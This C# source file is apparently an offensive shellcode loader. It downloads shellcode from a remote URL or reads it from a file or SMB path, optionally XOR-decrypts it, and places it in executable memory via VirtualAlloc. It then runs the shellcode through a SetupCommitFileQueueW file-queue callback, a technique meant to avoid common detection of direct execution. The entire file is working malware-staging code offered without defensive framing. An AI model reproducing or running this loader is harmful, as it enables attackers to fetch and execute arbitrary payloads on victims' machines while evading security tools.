using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.IO;

class Program
{
    // Constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint SP_COPY_NOSKIP = 0x00000001;

    // Delegate for PSP_FILE_CALLBACK_W
    delegate uint PSP_FILE_CALLBACK_W(IntPtr Context, uint Notification, IntPtr Param1, IntPtr Param2);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int RtlMoveMemory(IntPtr dest, byte[] src, uint size);

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr GetTopWindow(IntPtr hWnd);

    [DllImport("setupapi.dll", SetLastError = true)]
    static extern IntPtr SetupOpenFileQueue();

    [DllImport("setupapi.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SetupQueueCopyW(IntPtr QueueHandle, string SourceRootPath, string SourcePath, string SourceFilename,
                                       string SourceDescription, string SourceTagfile, string TargetDirectory, string TargetFilename, uint CopyStyle);

    [DllImport("setupapi.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SetupCommitFileQueueW(IntPtr Owner, IntPtr QueueHandle, PSP_FILE_CALLBACK_W MsgHandler, IntPtr Context);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        RtlMoveMemory(hAlloc, shellcode, (uint)shellcode.Length);

        IntPtr hQueue = SetupOpenFileQueue();

        if (!SetupQueueCopyW(hQueue, "c:\\", "\\windows\\system32\\", "kernel32.dll", null, null, "c:\\windows\\temp\\", "kernel32.dll", SP_COPY_NOSKIP))
        {
            Console.WriteLine($"[Failed] SetupQueueCopyW failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        PSP_FILE_CALLBACK_W pspFileCallbackW = (IntPtr Context, uint Notification, IntPtr Param1, IntPtr Param2) =>
        {
            // Cast shellcode address to delegate and invoke
            var shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(hAlloc);
            shellcodeDelegate();
            return 0;
        };

        if (!SetupCommitFileQueueW(GetTopWindow(IntPtr.Zero), hQueue, pspFileCallbackW, IntPtr.Zero))
        {
            Console.WriteLine($"[Failed] SetupCommitFileQueueW failed. Error Code: {Marshal.GetLastWin32Error()}");
        }
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void ShellcodeDelegate();
}
